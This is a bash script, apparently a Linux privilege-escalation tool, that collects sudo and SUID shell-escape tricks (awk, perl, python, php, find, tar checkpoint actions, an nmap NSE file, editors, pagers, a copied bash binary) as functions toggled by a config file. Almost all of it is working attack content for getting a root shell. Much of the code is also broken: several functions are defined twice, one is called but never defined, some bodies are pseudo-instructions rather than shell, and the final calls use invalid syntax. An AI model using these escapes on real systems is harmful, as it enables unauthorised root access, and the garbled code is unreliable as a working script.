#!/bin/bash
# |=====================|
# | Versias 1.1 [PUPS]  |
# |=====================|
# config.cfg - configuration file
# !! FILE config.cfg MUST BE IN THE SAME FOLDERS AS exp.sh !!
# PUMPKIN YA DADA 

source ./config.cfg

echo "==========================================="
echo "Script start. by PUMPKIN YA DADA"
echo "==========================================="

#=======================================|
# SUDO FIND                             |
#=======================================| 
find_sudo() {
    if [[ $2 -eq 1 ]] 
    then
        if find / -perm -u=s -type f 2>/dev/null | grep -q find; 
        then
            touch hacker
            find hacker -exec $fn1command \;
        fi 
    fi
}

#=======================================|
# SUDO AWK                              |
#=======================================| 
AWK_sudo() {
    if [[ $1 -eq 1 ]] 
    then
        awk 'BEGIN {system("/bin/sh")}'
    fi
}

#=======================================|
# SUDO PERL                             |
#=======================================| 
perl_sudo() {
    if [[ $1 -eq 1 ]] 
    then
        perl -e 'exec "/bin/sh";'
    fi
}

#=======================================|
# SUDO PYTHON                           |
#=======================================| 
python_sudo() {
    if [[ $1 -eq 1 ]] 
    then
        python -c 'import pty;pty.spawn("/bin/sh")'
    fi
}

#=======================================|
# SUDO PHP                              |
#=======================================| 
php_sudo() {
    if [[ $1 -eq 1 ]] 
    then
        php -r 'system("/bin/sh");'
    fi
}

#=======================================|
# SUDO   RUBY                           |
#=======================================| 
ruby_sudo() {
    if [[ $1 -eq 1 ]] 
    then
        ruby -e 'exec "/bin/sh"'
    fi
}

#=======================================|
# SUDO   LESS                           |
#=======================================| 
less_sudo() {
    if [[ $1 -eq 1 ]] 
    then
        !sh
    fi
}

#=======================================|
# SUDO   MORE                           |
#=======================================| 
more_sudo() {
    if [[ $1 -eq 1 ]] 
    then
        !sh
    fi
}

#=======================================|
# SUDO MAN                              |
#=======================================| 
man_sudo() {
    if [[ $1 -eq 1 ]] 
    then
        !sh
    fi
}

#=======================================|
# SUDO NMAP                             |
#=======================================| 
nmap_sudo() {
    if [[ $1 -eq 1 ]] 
    then
        echo "os.execute('/bin/sh')" > /tmp/shell.nse
    fi
}

#=======================================|
# SUDO FIND                             |
#=======================================| 
find_sudo() {
    if [[ $1 -eq 1 ]] 
    then
        find / -exec /usr/bin/awk 'BEGIN {system(\"/bin/sh\")}' \;
    fi
}

#=======================================|
# SUDO FIND 2                           |
#=======================================| 
find2_sudo() {
    if [[ $1 -eq 1 ]] 
    then
        find / -exec sh -i \;
    fi
}

#=======================================|
# SUDO VI                               |
#=======================================| 
vi_sudo() {
    if [[ $1 -eq 1 ]] 
    then
        vi name
        :!sh or :shell or -c '!sh'
    fi
}


#=======================================|
# SUDO VIM                              |
#=======================================| 
vim_sudo() {
    if [[ $1 -eq 1 ]] 
    then
        vim name
        :!sh or :shell or -c '!sh'
    fi
}

#=======================================|
# SUDO GDB                              |
#=======================================| 
#gdb_sudo() {
#    if [[ $1 -eq 1 ]] 
#    then
#        
#        shell 
#    fi
#}

#=======================================|
# SUDO PINFO                            |
#=======================================| 
pinfo_sudo() {
    if [[ $1 -eq 1 ]] 
    then
        ! -> less -> !sh
    fi
}

#=======================================|
# SUDO MUTT                             |
#=======================================| 
mutt_sudo() {
    if [[ $1 -eq 1 ]] 
    then
        ! -> sh
    fi
}

#=======================================|
# SUDO EXPECT                           |
#=======================================| 
expect_sudo() {
    if [[ $1 -eq 1 ]] 
    then
        expect or expect -> sh
    fi
}

#=======================================|
# SUDO DOCKER                           |
#=======================================| 
docker_sudo() {
    if [[ $1 -eq 1 ]] 
    then
        docker exec -ti {CONTAINER_ID} bash
    fi
}

#=======================================|
# SUDO FTP                              |
#=======================================| 
ftp_sudo() {
    if [[ $1 -eq 1 ]] 
    then
        !sh
    fi
}

#=======================================|
# SUDO IRB                              |
#=======================================| 
irb_sudo() {
    if [[ $1 -eq 1 ]] 
    then
        exec '/bin/sh'
    fi
}

#=======================================|
# SUDO ED                               |
#=======================================| 
ed_sudo() {
    if [[ $1 -eq 1 ]] 
    then
        !'/bin/sh'
    fi
}

#=======================================|
# SUDO LINKS                            |
#=======================================| 
ed_sudo() {
    if [[ $1 -eq 1 ]] 
    then
        echo "ESC -> FILE -> OS Shell"
    fi
}

#=======================================|
# SUDO lynx                             |
#=======================================| 
lynx_sudo() {
    if [[ $1 -eq 1 ]] 
    then
        lynx --editor=/usr/bin/vi www.postenum.com
    fi
}

#=======================================|
# SUDO /                                |
#=======================================| 
bask_sudo() {
    if [[ $1 -eq 1 ]] 
    then
        /bin/bash 
        /bin/sh
    fi
}

#=======================================|
# SUDO CP                               |
#=======================================| 
cp_sudo() {
    if [[ $1 -eq 1 ]] 
    then
        cp /bin/bash escape_bash 
        ./escape_bash
    fi
}

#=======================================|
# SUDO TAR                              |
#=======================================| 
tar_sudo() {
    if [[ $1 -eq 1 ]] 
    then
        tar xf /dev/null -I '/bin/sh -c "sh <&2 1>&2"'
    fi
}

#=======================================|
# SUDO TAR 2                            |
#=======================================| 
tar2_sudo() {
    if [[ $1 -eq 1 ]] 
    then
        tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
    fi
}

#=======================================|
# SUDO NODE                             |
#=======================================| 
node_sudo() {
    if [[ $1 -eq 1 ]] 
    then
        node -e 'var exec = require("child_process").exec; exec("id", function (error, stdOut, stdErr) {console.log(stdOut);});'
    fi
}

#-----------------------------------------------
find_sudo() $fn1command $fn1commandOffOn
AWK_sudo() $AWK_sudo
perl_sudo() $perl_sudo
python_sudo() $python_sudo
php_sudo() $php_sudo
ruby_sudo() $ruby_sudo
less_sudo() $less_sudo
more_sudo() $more_sudo 
man_sudo() $man_sudo
nmap_sudo() $nmap_sudo
find_sudo() $find_sudo
find2_sudo() $find2_sudo
vi_sudo() $vi_sudo
vim_sudo() $vim_sudo
#gdb_sudo() $gdb_sudo
pinfo_sudo() $pinfo_sudo
mutt_sudo() $mutt_sudo
expect_sudo() $expect_sudo
docker_sudo() $docker_sudo
ftp_sudo() $ftp_sudo
irb_sudo() $irb_sudo
ed_sudo() $ed_sudo 
links_sudo() $links_sudo
lynx_sudo() $lynx_sudo
bask_sudo() $bask_sudo
cp_sudo() $cp_sudo
tar_sudo() $tar_sudo
tar2_sudo() $tar2_sudo
node_sudo() $node_sudo
#------------------------------------------------
echo "==========================================="             
echo "Script finished. by PUMPKIN YA DADA"         
echo "===========================================" 
# PUMPKIN YA DADA                                  



#░░░░░░░░░░░█████████████
#░░░░░░░░░███░███░░░░░░██
#███░░░░░██░░░░██░██████████
#████████░░░░░░████░░░░░░░██
#████░░░░░░░░░░██░░██████████
#████░░░░░░░░░░░███░░░░░░░░░██
#████░░░░░░░░░░░██░░██████████
#████░░░░░░░░░░░░████░░░░░░░░█
#████░░░░░░░░░░░░░███░░████░░█
#█████████░░░░░░░░░░████░░░░░█
#███░░░░░██░░░░░░░░░░░░░█████
#░░░░░░░░░███░░░░░░░██████
#░░░░░░░░░░░██░░░░░░██
#░░░░░░░░░░░░███░░░░░██
#░░░░░░░░░░░░░░██░░░░██
#░░░░░░░░░░░░░░░███░░░██
#░░░░░░░░░░░░░░░░░██░░░█
#░░░░░░░░░░░░░░░░░░█░░░█
#░░░░░░░░░░░░░░░░░░██░██
#░░░░░░░░░░░░░░░░░░░███
